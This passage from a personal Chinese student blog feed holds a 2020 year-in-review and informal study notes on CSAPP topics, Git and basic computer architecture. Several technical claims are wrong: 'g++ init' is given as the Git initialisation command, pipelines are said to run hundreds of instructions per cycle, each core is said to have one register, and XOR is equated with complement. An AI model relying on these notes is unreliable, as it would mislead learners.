写程序前没有认真思考并写注释思路的习惯所以当时思路混乱导致T2失误; 下午S组基本白给 看了下这些题发现都很复杂估计了一下自己的水平估计只能写一题, 就 他 妈 选 了 T 1,以为是签到题….然后打了4小时大模拟, 也没有什么打表 二分之类的优化还是爆零了, 最终J组65, S组0, 详见游记: <ahref="https://www.luogu.com.cn/blog/airx/csp-js-quan-zha-liao">CSP-J/S全炸了</a></li><li>回来后心态很不好 加上父母的一些事, 导致整个月心里都不太安稳</li><li>回归了Minecraft. 每次人生落入低谷, MC总会出现在那….</li><li>然后重心逐渐转向文化课, 很少刷题了,月末的时候突然想搞一套自律的方案, 这个一会说</li><li>开始学习&lt;<深入理解计算机系统>&gt;(CSAPP) 这是我的第三本黑皮书,写了一些博客(CSAPP Today系列, 咕了很久但会继续更的)</li><li>排除了一下 发现OI知识体系里普及组的我差不多快完事了但还剩一个动态规划的大块, 于是开始学习动态规划. 数字三角形然后LIS/LCS学了好久不懂, 好不容易懂了然后学背包九讲(01完全多重混合分组二维…..)</li><li>十一月刷题数6</li></ul></li><li>2020年12月<ul><li>11月末开始写的wml项目 这是一个比较奇怪的项目主要是通过一些进度条来提示你不能颓废了 比如30%一下进度条红色,99%以下蓝色, 100%绿色… 还有疲惫值用来严格控制娱乐时间(疲惫值过大就要娱乐 娱乐完减小进度条)</li><li>后来又增加了剩余时间显示 直观地显示还有多少时间可以给心理正向反馈</li><li>学了很多设计模式 也算OI之外的了, 用Java重构了wml(之前是C++写的)</li><li>wml和wml-java也在github! <ahref="https://github.com/AMIRIOX/wml-java">wml-java</a>和<ahref="https://github.com/AMIRIOX/wml">wml-cpp</a>.</li><li>准备期末考试 很少看CSAPP了, 偶尔看一下共产党宣言之类的</li><li>发生了一些事情 不打算说 不过还是蛮有意思的吧….</li><li>待更… 2020年最后五天 会有惊喜吗?</li></ul><blockquote><p>upd 2024-10-02 22:36:54<br />在 2023年的最后几天，我和那个至今都时常光临我的梦的、无法忘记的人在一起了<br />然而现在已经分手了。<br />生活总是充满遗憾，不是吗？<br />2021的年终总结标题“直面灾厄”是当时写了就起好的，但这一篇的“辉煌落幕”则只是我对年轻时自己的无奈感叹了。<br />amiriox, 我能抱抱你吗？</p></blockquote><blockquote><p>upd 2025-01-03 10:46:00 2024.12.31的时候，如果没分手的话应该是一周年纪念了<br />我又去了那家医院，虽然不知道出于什么动机。 春节之前得写 22, 23, 24三年的总结，高中总结… 等等 不知道写下那些的时候我又会是什么心情呢</p></blockquote></li></ul><h1 id="三-总结">三 总结</h1><p>这一年 进入了OI的世界 进入了Linux的世界<del>没能进入你的世界</del></p><p>学习了很多东西 开阔了很多眼界 认识了很多朋友</p><p>经历了很多挫折 承受了许多苦难 看到了许多黑暗</p><p>你看到了吗? 这就是2020 多么神奇的一年啊!</p><blockquote><p>这一年的优点:</p><ul><li>心智成熟了很多 不再是xxs了</li><li>OI水平跨越 至少在知识点上是普及组水平了 (但思维还是太差/kk)</li><li>学习了很多OI之外的知识 多线程啊 设计模式啊, 代码质量++;</li><li>对生活有更好的计划 同时也不失自由</li><li>承受能力变强! qwq</li></ul></blockquote><blockquote><p>这一年的不足:</p><ul><li>自我控制做的仍然不好, 颓时知道不应该 心里有压力, 但又控制不住</li><li>心态不够宽, 对某些事情看的并不是很开, 心态要平衡</li><li>情绪影响太大 要学会控制情绪(控制=压抑+发泄)</li><li>学习效率低 刷题效率低</li></ul></blockquote><h1 id="待更-不知道写什么好">待更, 不知道写什么好</h1><h3 id="有人有建议吗">有人有建议吗?</h3>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;2020对我来说是极其重要的一年, 堪比2018年&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;一-简述&quot;&gt;一 简述&lt;/h1&gt;
&lt;p&gt;这一年乱七八糟的 想起来似乎没有记忆却又全是记忆&lt;/p&gt;
&lt;p&gt;由于疫情的原因 这一年变得很奇怪&lt;/p&gt;</summary>
    
    
    
    <category term="年终总结" scheme="https://amiriox.github.io/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 2020-12-06</title>
    <link href="https://amiriox.github.io/2020/12/06/CSAPP-2020-12-06/"/>
    <id>https://amiriox.github.io/2020/12/06/CSAPP-2020-12-06/</id>
    <published>2020-12-05T16:00:00.000Z</published>
    <updated>2025-02-13T16:09:49.373Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> 可能有误</p></blockquote><p><del>这周比较烦, 详见随笔</del></p><p>CSAPP Today:</p><blockquote><p>主要是一些oier们几乎人均知道的进制内容, 还有一些关于信息储存方式</p></blockquote><ol type="1"><li>十六进制的表示方法, 与二进制的转换<code>0x173A4C</code>转换成二进制, 每位的二进制组合起来</li></ol><table><thead><tr><th style="text-align: center;">1</th><th style="text-align: center;">7</th><th style="text-align: center;">3</th><th style="text-align: center;">A</th><th style="text-align: center;">4</th><th style="text-align: center;">C</th></tr></thead><tbody><tr><td style="text-align: center;">0001</td><td style="text-align: center;">0111</td><td style="text-align: center;">0011</td><td style="text-align: center;">1010</td><td style="text-align: center;">0100</td><td style="text-align: center;">1100</td></tr></tbody></table><p>则<code>0x173A4C</code>的二进制为<code>000101110011101001001100</code><br />相反地, 二进制转换为十六进制, 只需要分为四位一组推回十进制用十六进制表示;<br />特别地, 对于不是4的倍数总数的二进制, 允许最左面的四位不为四位</p><ol start="2" type="1"><li><p>字数据大小 也叫字长, 表示虚拟地址空间的访问范围在<spanclass="math inline">\([0,2^{w}-1]\)</span>范围内<br />常见的有64位和32位, 不同字长中对于语言的实现的数据类型大小不同</p></li><li><p>寻址, 大端法和小端法一个十六进制数据的值为<code>0x01234567</code>,以下是大端法和小端法的表示 (假设开始寻址的地址为0x100)</p></li></ol><ul><li>大端法</li></ul><table><thead><tr><th style="text-align: center;">0x100</th><th style="text-align: center;">0x101</th><th style="text-align: center;">0x102</th><th style="text-align: center;">0x103</th></tr></thead><tbody><tr><td style="text-align: center;">01</td><td style="text-align: center;">23</td><td style="text-align: center;">45</td><td style="text-align: center;">67</td></tr></tbody></table><ul><li>小端法</li></ul><table><thead><tr><th style="text-align: center;">0x100</th><th style="text-align: center;">0x101</th><th style="text-align: center;">0x102</th><th style="text-align: center;">0x103</th></tr></thead><tbody><tr><td style="text-align: center;">67</td><td style="text-align: center;">45</td><td style="text-align: center;">23</td><td style="text-align: center;">01</td></tr></tbody></table><p>可见符合人脑的方式是大端法, 但除了个别古老和特殊用处机器外,一般实现(Intel)都是小端法</p><p><code>0x01234567</code>中<code>0x01</code>才是高位进制,<code>0x67</code>是低位</p><ol start="4" type="1"><li>表示字符串 这个oier耳熟能详, ASCII嘛, 不再赘述<br />主义由于大小端表示方法不同,所以<strong>十六进制数据不一定是跨平台的</strong>, 但ASCII一定是</li></ol><p><del>回来说说布尔代数和瞎写的日记</del></p><h1 id="布尔代数">布尔代数</h1><p>最简单布尔代数是建立在一个最简单的集合<spanclass="math inline">\({0,1}\)</span>上的</p><p>类似地, <code>&amp;</code>, <code>|</code>,与C++中的使用方式一样.</p><ul><li>位向量</li></ul><p>对于长度<strong>固定</strong>为 <spanclass="math inline">\(w\)</span> ,由0和1构成的串称为位向量,<br />位向量的运算就是每一位的对应运算, 如<spanclass="math inline">\(a=[01]\)</span>和<spanclass="math inline">\(b=[11]\)</span>, <spanclass="math inline">\(a&amp;b\)</span>就是<spanclass="math inline">\([0&amp;1,1&amp;1]=[0,1]\)</span></p><p>位向量的一个好的用途是表示集合,这个紫书在说子集的时候(暴力枚举那一章)说过<br />如果第n位为, 那么表示没有这个数,为1则有(**注意这里是把最后一位放到最前面)<br /><code>&amp;</code> <code>|</code> <code>^</code>则分别对应交集并集和补集, 这个很好理解 可以自行思考一下</p><p>欸 还有一些布尔代数的运算规律 然而我还没搞清楚原理 暂时就不发了</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;这周比较烦, 详见随笔&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;CSAPP Today:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;主要是一些oier们几乎人均知道的进制内容, 还有一些关于信息储存方式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;十六进制的表示方法, 与二进制的转换
&lt;code&gt;0x173A4C&lt;/code&gt;转换成二进制, 每位的二进制组合起来&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 2020-11-20</title>
    <link href="https://amiriox.github.io/2020/11/20/CSAPP-2020-11-20/"/>
    <id>https://amiriox.github.io/2020/11/20/CSAPP-2020-11-20/</id>
    <published>2020-11-19T16:00:00.000Z</published>
    <updated>2025-02-13T16:09:33.049Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> 可能有误</p></blockquote><p><del>又到了开心的周末!</del></p><p>CSAPP Today:</p><ol type="1"><li><p>Amdahl’s law</p><ul><li><span class="math inline">\(Amdahl\)</span> 定律: 设一个操作原来需要<span class="math inline">\(T_{old}\)</span> 的时间执行,现在我们对其<span class="math inline">\(a\)</span>的部分(即 <spanclass="math inline">\(\text{总部分}\times\text{a}\)</span>这部分进行<span class="math inline">\(1/k\)</span>的优化(原来这部分<span class="math inline">\(T\)</span> 时间可以执行完, 现在加速到了<span class="math inline">\(T/k\)</span> ), 则<ul><li>没有加速的部分所需时间: <span class="math inline">\((1-a)\timesT_{old}\)</span></li><li>加速的部分所需时间: <span class="math inline">\((a\timesT_{old})/k\)</span></li></ul></li></ul><p>所以总体加速后的时间为 <spanclass="math display">\[T_{new}=(1-a)\times T_{old} + (a\timesT_{old})/k\]</span> 所以加速比<spanclass="math inline">\(S=T_{old}/T_{new}\)</span>就是</p><p><spanclass="math display">\[S=\frac{T_{old}}{T_{new}}=\frac{T_{old}}{(1-a)\timesT_{old} + (a\times T_{old})/k}=\frac{1}{(1-a)+a/k}\]</span></p><p>常见的表示方法是用算出的加速比后加上一个”<spanclass="math inline">\(\times\)</span>“,我们对 <spanclass="math inline">\(60\%\)</span> 的部分进行优化,这部分执行时间到了原来的 <span class="math inline">\(1/3\)</span> , 则<span class="math inline">\(a=0.6, k=3\)</span> ,带入公式得出 <spanclass="math inline">\(S=1.67\)</span> , 则加速比就是<spanclass="math inline">\(1.67 \times\)</span>, 读做”1.67倍”.</p><ul><li>当 <span class="math inline">\(k\)</span> 趋向于 <spanclass="math inline">\(\infty\)</span> 时, 这部分时间可以忽略不计,于是就有 <spanclass="math display">\[S_{\infty}=\frac{1}{(1-a)}\]</span> 即使 <spanclass="math inline">\(60\%\)</span> 的系统可以加速到可以忽略时间的程度,总体加速比也只有 <span class="math inline">\(2.5 \times\)</span>,这体现了amdahl定律的一个重要思想: &gt; 只有提升了系统的大部分,才能更好的提升整个系统</li></ul><p>待更新, 先吃个饭</p></li><li><p>并行/并发</p><ul><li>并发是指同时处理多个活动</li><li>并行是指通过并发来加速系统<ol type="1"><li>线程级并发<ul><li>最初的系统并不是完全意义上的同时操作, 而是反复切换上下文(<del>反 复横 跳</del> 上一篇有说上下文, 主要是指当前进程的主存/寄存器文件),后来多核和超线程出现才有了真正的并发</li><li>多核是指把多个CPU搞到一个集成电路板上,每个CPU叫一个<em>核心(core)</em> 比如我的dell-inspiron 5590是4核心,就是四个倒霉鬼被焊在电路板上了 (逃, 据工厂主 <del>资本家</del>说未来他们可以焊接几百的核心到一块板子上</li><li>超线程指的是一个核心执行多个线程, 主要也是线程切换实现的,但是比普通的CPU横跳地更科学, 所以速度也更快,比如如果这个线程需要一些时间加载一个数据, 那我就切走了 你自己玩,我去干别的</li><li>这就很好解释了为什么我的PC叫”四核心八线程”, 表示有四个核心,每个核心是一个可以同时执行两个线程(<del>跳板</del>)的超线程核心</li><li>现代CPU大多数都是多核多线程核心,一般他们的结构都是<strong>每个核心分别</strong>有一个寄存器,两个L1高速缓存(详见上一篇)和两个L1共用的L2高速缓存,然后总体上有一个所有核心共用的高速缓存L3, 然后接到总线和主存,其中每个核心中的两个L1高速缓存分别是数据和指令缓存.所以4核心8线程的CPU一般来讲有 <span class="math inline">\(4 \times 3 + 1= 13\)</span>个高速缓存和<span class="math inline">\(4 \times1=4\)</span>个寄存器</li></ul></li><li>指令级并发<ul><li>指同时执行多个指令, 这是个比较nb的概念,之前可能一个指令执行很多个(3~10)时钟周期,现在通过一个叫”流水线”的东西实现指令级并发,可以一个时钟周期内执行<strong>上百个</strong>指令</li><li>像上面那样,一个时钟周期可以处理<strong>不止一个</strong>指令叫<strong>超标量</strong>,大多数PC的CPU都支持这个<del>不会吧不会吧不会都0202年了还有人的电脑不支持超标量吧</del></li></ul></li><li>单指令多数据<ul><li>比如处理单精度浮点数(float)加法是一个指令, 这叫单指令</li><li>同时处理8对float加法, 这叫多数据</li><li>这是同时执行的, 也叫SIMD, 不知道具体叫什么, 我猜<spanclass="math inline">\(Single\ Instruction\ Multi\ Data\)</span></li><li>有时候cpu会对一些程序自动处理SIMD, 但更好的办法是编译器来解决这些,比如GCC就支持向量变量</li></ul></li></ol></li></ul></li></ol><p>为什么我用中文输入法打出来<code>cpu</code>第一个是<code>川普</code>啊</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;又到了开心的周末!&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;CSAPP Today:&lt;/p&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;&lt;p&gt;Amdahl’s law&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&quot;math inline&quot;&gt;&#92;(Amdahl&#92;)&lt;/span&gt; 定律: 设一个操作原来需要
&lt;span class=&quot;math inline&quot;&gt;&#92;(T_{old}&#92;)&lt;/span&gt; 的时间执行,
现在我们对其&lt;span class=&quot;math inline&quot;&gt;&#92;(a&#92;)&lt;/span&gt;的部分(即 &lt;span class=&quot;math inline&quot;&gt;&#92;(&#92;text{总部分}&#92;times&#92;text{a}&#92;)&lt;/span&gt;
这部分进行&lt;span class=&quot;math inline&quot;&gt;&#92;(1/k&#92;)&lt;/span&gt;的优化(原来这部分
&lt;span class=&quot;math inline&quot;&gt;&#92;(T&#92;)&lt;/span&gt; 时间可以执行完, 现在加速到了
&lt;span class=&quot;math inline&quot;&gt;&#92;(T/k&#92;)&lt;/span&gt; ), 则
&lt;ul&gt;
&lt;li&gt;没有加速的部分所需时间: &lt;span class=&quot;math inline&quot;&gt;&#92;((1-a)&#92;times
T_{old}&#92;)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;加速的部分所需时间: &lt;span class=&quot;math inline&quot;&gt;&#92;((a&#92;times
T_{old})/k&#92;)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以总体加速后的时间为 &lt;span class=&quot;math display&quot;&gt;&#92;[T_{new}=(1-a)&#92;times T_{old} + (a&#92;times
T_{old})/k&#92;]&lt;/span&gt; 所以加速比&lt;span class=&quot;math inline&quot;&gt;&#92;(S=T_{old}/T_{new}&#92;)&lt;/span&gt;就是&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;&#92;[S=&#92;frac{T_{old}}{T_{new}}=&#92;frac{T_{old}}{(1-a)&#92;times
T_{old} + (a&#92;times T_{old})/k}=&#92;frac{1}{(1-a)+a/k}&#92;]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;常见的表示方法是用算出的加速比后加上一个”&lt;span class=&quot;math inline&quot;&gt;&#92;(&#92;times&#92;)&lt;/span&gt;“,我们对 &lt;span class=&quot;math inline&quot;&gt;&#92;(60&#92;%&#92;)&lt;/span&gt; 的部分进行优化,
这部分执行时间到了原来的 &lt;span class=&quot;math inline&quot;&gt;&#92;(1/3&#92;)&lt;/span&gt; , 则
&lt;span class=&quot;math inline&quot;&gt;&#92;(a=0.6, k=3&#92;)&lt;/span&gt; ,带入公式得出 &lt;span class=&quot;math inline&quot;&gt;&#92;(S=1.67&#92;)&lt;/span&gt; , 则加速比就是&lt;span class=&quot;math inline&quot;&gt;&#92;(1.67 &#92;times&#92;)&lt;/span&gt;, 读做”1.67倍”.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 &lt;span class=&quot;math inline&quot;&gt;&#92;(k&#92;)&lt;/span&gt; 趋向于 &lt;span class=&quot;math inline&quot;&gt;&#92;(&#92;infty&#92;)&lt;/span&gt; 时, 这部分时间可以忽略不计,
于是就有 &lt;span class=&quot;math display&quot;&gt;&#92;[S_{&#92;infty}=&#92;frac{1}{(1-a)}&#92;]&lt;/span&gt; 即使 &lt;span class=&quot;math inline&quot;&gt;&#92;(60&#92;%&#92;)&lt;/span&gt; 的系统可以加速到可以忽略时间的程度,
总体加速比也只有 &lt;span class=&quot;math inline&quot;&gt;&#92;(2.5 &#92;times&#92;)&lt;/span&gt;,
这体现了amdahl定律的一个重要思想: &amp;gt; 只有提升了系统的大部分,
才能更好的提升整个系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;待更新, 先吃个饭&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;并行/并发&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;并发是指同时处理多个活动&lt;/li&gt;
&lt;li&gt;并行是指通过并发来加速系统
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;线程级并发
&lt;ul&gt;
&lt;li&gt;最初的系统并不是完全意义上的同时操作, 而是反复切换上下文(&lt;del&gt;反 复
横 跳&lt;/del&gt; 上一篇有说上下文, 主要是指当前进程的主存/寄存器文件),
后来多核和超线程出现才有了真正的并发&lt;/li&gt;
&lt;li&gt;多核是指把多个CPU搞到一个集成电路板上,
每个CPU叫一个&lt;em&gt;核心(core)&lt;/em&gt; 比如我的dell-inspiron 5590是4核心,
就是四个倒霉鬼被焊在电路板上了 (逃, 据工厂主 &lt;del&gt;资本家&lt;/del&gt;
说未来他们可以焊接几百的核心到一块板子上&lt;/li&gt;
&lt;li&gt;超线程指的是一个核心执行多个线程, 主要也是线程切换实现的,
但是比普通的CPU横跳地更科学, 所以速度也更快,
比如如果这个线程需要一些时间加载一个数据, 那我就切走了 你自己玩,
我去干别的&lt;/li&gt;
&lt;li&gt;这就很好解释了为什么我的PC叫”四核心八线程”, 表示有四个核心,
每个核心是一个可以同时执行两个线程(&lt;del&gt;跳板&lt;/del&gt;)的超线程核心&lt;/li&gt;
&lt;li&gt;现代CPU大多数都是多核多线程核心,
一般他们的结构都是&lt;strong&gt;每个核心分别&lt;/strong&gt;有一个寄存器,
两个L1高速缓存(详见上一篇)和两个L1共用的L2高速缓存,
然后总体上有一个所有核心共用的高速缓存L3, 然后接到总线和主存,
其中每个核心中的两个L1高速缓存分别是数据和指令缓存.
所以4核心8线程的CPU一般来讲有 &lt;span class=&quot;math inline&quot;&gt;&#92;(4 &#92;times 3 + 1
= 13&#92;)&lt;/span&gt;个高速缓存和&lt;span class=&quot;math inline&quot;&gt;&#92;(4 &#92;times
1=4&#92;)&lt;/span&gt;个寄存器&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;指令级并发
&lt;ul&gt;
&lt;li&gt;指同时执行多个指令, 这是个比较nb的概念,
之前可能一个指令执行很多个(3~10)时钟周期,
现在通过一个叫”流水线”的东西实现指令级并发,
可以一个时钟周期内执行&lt;strong&gt;上百个&lt;/strong&gt;指令&lt;/li&gt;
&lt;li&gt;像上面那样,
一个时钟周期可以处理&lt;strong&gt;不止一个&lt;/strong&gt;指令叫&lt;strong&gt;超标量&lt;/strong&gt;,
大多数PC的CPU都支持这个
&lt;del&gt;不会吧不会吧不会都0202年了还有人的电脑不支持超标量吧&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;单指令多数据
&lt;ul&gt;
&lt;li&gt;比如处理单精度浮点数(float)加法是一个指令, 这叫单指令&lt;/li&gt;
&lt;li&gt;同时处理8对float加法, 这叫多数据&lt;/li&gt;
&lt;li&gt;这是同时执行的, 也叫SIMD, 不知道具体叫什么, 我猜&lt;span class=&quot;math inline&quot;&gt;&#92;(Single&#92; Instruction&#92; Multi&#92; Data&#92;)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;有时候cpu会对一些程序自动处理SIMD, 但更好的办法是编译器来解决这些,
比如GCC就支持向量变量&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;为什么我用中文输入法打出来&lt;code&gt;cpu&lt;/code&gt;第一个是&lt;code&gt;川普&lt;/code&gt;啊&lt;/p&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Git 版本控制</title>
    <link href="https://amiriox.github.io/2020/11/20/GIT_1/"/>
    <id>https://amiriox.github.io/2020/11/20/GIT_1/</id>
    <published>2020-11-19T16:00:00.000Z</published>
    <updated>2025-02-13T16:14:42.890Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> <em>撰写日期</em> 绝对有问题</p></blockquote><blockquote><p>此文章 没有写完</p></blockquote><h1 id="了解git">了解Git:</h1><blockquote><p>Git是一个版本控制系统. 常用场景如下 ## 场景一:程序员A写了个功能,但写好后怎么交?直接替换文件?非也 直接git mergemaster(下面会说) ## 场景二: 开发者A写了一个功能,然后提交到开发环境开发者B发现开发者A代码里的一个bug,修好后提交到开发环境开发者B修bug时写出了一个bug,只好返回原来版本(即下面要说的checkout)修bug</p></blockquote><p>总之, git是一个在不断更新产品/修复bug过程中倒腾版本的东西当然,也可以和github.com或gitee.com等代码托管平台(远程仓库)配合</p><p>下面开始介绍</p><h1 id="安装">安装</h1><p>点击<ahref="https://git-scm.com/downloads">https://git-scm.com/downloads</a>,选择Download下面的Windows(当然你也可以选你对应的操作系统)然后下载后正常安装,并将<code>&#123;Git安装目录&#125;\bin</code>和<code>&#123;Git安装目录&#125;\mingw64\libexec\git-core</code>添加到path环境变量<img src="https://s1.ax1x.com/2020/05/13/YwMPmt.png" alt="YwMPmt.png" />然后打开cmd或gitbash输入<code>git</code>,如果出现一大堆帮助信息那就成功了</p><h1 id="概念解释">概念解释</h1><h2 id="git工作原理">git工作原理</h2><p>“分支”是指一个项目的不同版本,一般情况下,修改bug或添加功能会创建一个新的分支然后合并到主分支(<spanclass="math inline">\(master\)</span>),主分支就是最稳定的版本git实际上是分为三个区域, <code>工作区</code>, <code>暂存区</code>和<code>版本库</code> 工作区(<spanclass="math inline">\(workspace\)</span>),就是你写代码的本地文件夹暂存区(<spanclass="math inline">\(stage/index\)</span>),存放在<code>.git</code>文件夹下面的index文件,顾名思义呗版本库,存放一些各个版本,分支的项目文件,存在<code>.git</code>文件夹下<strong>–一般地,我们不将版本库算在工作区中</strong> <imgsrc="https://s1.ax1x.com/2020/05/13/Yw12jJ.png" alt="Yw12jJ.png" />如图所示.</p><h1 id="开始实战">开始实战</h1><p>新建一个文件夹,我这里新建为<code>helloGit</code></p><p>然后打开cd切到这个路径(或右键选择<code>git bash here</code>)</p><p>输入以下命令($是提示符,不需要输入)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">g++ init</span></span><br></pre></td></tr></table></figure><p>初始化,使其成为git版本管理的项目之一</p><p><strong>不要乱动git init生成的.git文件夹.</strong></p><h1 id="待更.先睡觉去了-qwq">待更.先睡觉去了 qwq</h1>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; &lt;em&gt;撰写日期&lt;/em&gt; 绝对有问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;此文章 没有写完&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;了解git&quot;&gt;了解Git:&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Git是一个版本控制系统. 常用场景如下 ## 场景一:
程序员A写了个功能,但写好后怎么交?直接替换文件?非也 直接git merge
master(下面会说) ## 场景二: 开发者A写了一个功能,然后提交到开发环境
开发者B发现开发者A代码里的一个bug,修好后提交到开发环境
开发者B修bug时写出了一个bug,只好返回原来版本(即下面要说的checkout)修bug&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;总之, git是一个在不断更新产品/修复bug过程中倒腾版本的东西
当然,也可以和github.com或gitee.com等代码托管平台(远程仓库)配合&lt;/p&gt;</summary>
    
    
    
    <category term="软件工程" scheme="https://amiriox.github.io/categories/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="版本控制" scheme="https://amiriox.github.io/tags/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Crash Course Computer Science</title>
    <link href="https://amiriox.github.io/2020/11/20/CSSC/"/>
    <id>https://amiriox.github.io/2020/11/20/CSSC/</id>
    <published>2020-11-19T16:00:00.000Z</published>
    <updated>2025-02-13T16:22:17.908Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> <em>撰写时间</em> 可能有误</p></blockquote><p>继电器|真空管|晶体管</p><p>def <code>‘a new level of abstraction’</code><code>[-=&gt;]</code></p><p>晶体管 [=&gt;] 逻辑门（AND/OR/XOR/NOT）[=&gt;] 半加器/全加器 [=&gt;]ALU</p><p>晶体管 [=&gt;] 逻辑门（AND/OR/XOR/NOT）[=&gt;] 锁存器/门锁 [=&gt;]寄存器 + （并列|矩阵）+ 多路复用器 -&gt; SRAM （definition linking to<code>RAM</code>）</p><p>ALU &amp;&amp; Register/SRAM &amp;&amp; 逻辑门组成的解析指令 -&gt;Control Unit -&gt; CPU</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    ___________________________________________#—————————————————#</span><br><span class="line">    |            |        |           |        |  addr  |  value |</span><br><span class="line">REGISTER—A  REGISTER—B REGISTER—C REGISTER—D   |   0    |00100010|</span><br><span class="line">    |  |-----------|                           |   1    |00100001|</span><br><span class="line">  [ALU]--opcode--- [Control Unit]     |        |   2    |00000000|</span><br><span class="line">    |              |_[op: 0010,0001]  |        |   3    |00000000|</span><br><span class="line">    |              |_[addr: 00000001] |        |   4    |00000000|</span><br><span class="line">    |______________|_[FLAGS:O/Z/N]    |__W/R___#-----------------#</span><br><span class="line">    | OUTPUT</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;继电器|真空管|晶体管&lt;/p&gt;
&lt;p&gt;def &lt;code&gt;‘a new level of abstraction’&lt;/code&gt;
&lt;code&gt;[-=&amp;gt;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;晶体管 [=&amp;gt;] 逻辑门（AND/OR/XOR/NOT）[=&amp;gt;] 半加器/全加器 [=&amp;gt;]
ALU&lt;/p&gt;
&lt;p&gt;晶体管 [=&amp;gt;] 逻辑门（AND/OR/XOR/NOT）[=&amp;gt;] 锁存器/门锁 [=&amp;gt;]
寄存器 + （并列|矩阵）+ 多路复用器 -&amp;gt; SRAM （definition linking to
&lt;code&gt;RAM&lt;/code&gt;）&lt;/p&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
